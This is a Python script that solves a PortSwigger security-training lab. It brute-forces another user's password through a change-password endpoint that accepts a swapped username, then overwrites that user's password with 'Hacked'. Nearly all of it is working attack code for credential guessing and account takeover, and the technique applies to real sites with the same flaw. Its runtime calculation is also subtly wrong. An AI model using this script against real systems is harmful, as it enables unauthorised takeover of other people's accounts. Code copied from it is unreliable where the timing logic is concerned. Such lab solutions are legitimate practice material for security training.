################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 30/8/2023
#
# PortSwigger LAB: Password brute-force via password change
#
# Steps: 1. Login with correct creds
#        2. Change username when requesting change password API
#        3. Repeat the process trying every password
#
#################################################################

###########
# imports
###########
import requests
import re
import time
from colorama import Fore


# change this to your lab URL
url = "https://0a2b007c03db344bcf9c841200a20099.web-security-academy.net"
# change the paths to your lists
passwords = open("/home/ahmed/passwords",
                 'rt').read().splitlines()


############################################
# Function used to login with correct creds
############################################
def login(url, username, password):
    try:
        data = {
            "username": username,
            "password": password
        }
        return requests.post(url, data, allow_redirects=False)
    except:
        print(Fore.RED + "Failed to login as wiener through exception")


###############################################
# Function used to request change-password API
###############################################
def change_password(url, session, username, current_password, new_password):
    data = {
        "username": username,
        "current-password": current_password,
        "new-password-1": new_password,
        "new-password-2": new_password
    }
    headers = {
        "Cookie": f"session={session}"
    }
    try:
        return requests.post(url, data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "Failed change password request through exception")


###############################
# Starting point of the script
###############################
start_time = time.time()
print(Fore.WHITE + "[#] Brute forcing password of " +
      Fore.GREEN + F"carlos..")
for (index, password) in enumerate(passwords):
    login_res = login(f"{url}/login", "wiener", "peter")
    if login_res.status_code == 302:  # if you login successfully
        session = login_res.cookies.get("session")  # get the valid session
        new_password = "Hacked"  # chagne this to what you want
        change_res = change_password(f"{url}/my-account/change-password",
                                     session, "carlos", password, new_password)  # try to change the password
        if change_res.status_code == 200:
            print(Fore.BLUE + f"\n[*] {password} => " + Fore.GREEN + "Correct")
            print(Fore.WHITE +
                  f"[#] Password changed to: " + Fore.GREEN + new_password)
            break
        else:
            print(Fore.BLUE + f"[*] {password:10} => " +
                  Fore.RED + "Incorrect", end='\r', flush=True)
    else:
        print(Fore.RED + "Failed to login as wiener")

elapsed_time = int(time.time() - start_time / 60)
print(Fore.GREEN + "✅ Finished in: " +
      Fore.WHITE + str(elapsed_time) + "minutes")
